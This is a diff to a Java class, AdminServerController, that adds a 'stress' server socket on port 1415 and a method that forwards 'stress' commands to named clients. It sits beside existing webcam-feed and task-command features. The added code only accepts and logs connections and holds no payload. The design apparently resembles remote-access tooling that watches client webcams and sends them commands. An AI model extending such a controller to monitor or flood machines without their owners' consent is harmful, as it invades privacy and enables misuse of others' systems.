@@ -32,6 +32,7 @@ public class AdminServerController {
     private int clientCount = 0;
     private List<ClientHandler> clients = new ArrayList<ClientHandler>();
     private ServerSocket webcamServerSocket;
+    private ServerSocket stressServerSocket;
     private Map<String, JLabel> webcamLabels = new ConcurrentHashMap<>();
     private List<Integer> freeClientNumbers = new ArrayList<Integer>();
     private ServerSocket taskServerSocket;
@@ -87,6 +88,7 @@ public class AdminServerController {
         serverThread.start();
         startWebcamServer();
         startTaskServer();
+        startStressServer();
     }
 
     public void stopServer() {
@@ -190,6 +192,15 @@ public void sendTaskCommand(String clientName, String command) {
     sendCommandToClient(clientName, command);
 
 }
+public void sendStressCommand(
+            String clientName,
+            String command)
+    {
+        sendCommandToClient(
+                clientName,
+                command);
+    }
+
     public void registerWebcamLabel(String clientName, JLabel label) {
     webcamLabels.put(clientName, label);
 }
@@ -253,6 +264,35 @@ public void sendTaskCommand(String clientName, String command) {
         }
     }).start();
 }
+    public void startStressServer() {
+
+        new Thread(() -> {
+
+            try {
+
+                stressServerSocket =
+                        new ServerSocket(1415);
+
+                System.out.println(
+                        "[STRESS] Server started");
+
+                while (true) {
+
+                    Socket socket =
+                            stressServerSocket.accept();
+
+                    System.out.println(
+                            "[STRESS] Client connected");
+                }
+
+            } catch (Exception e) {
+
+                e.printStackTrace();
+
+            }
+
+        }).start();
+    }
 
     private class ClientHandler implements Runnable {
         private Socket socket;
@@ -355,6 +395,7 @@ public void sendTaskCommand(String clientName, String command) {
         } catch (Exception ignored) {
         }
     }
+
 }
 }
 
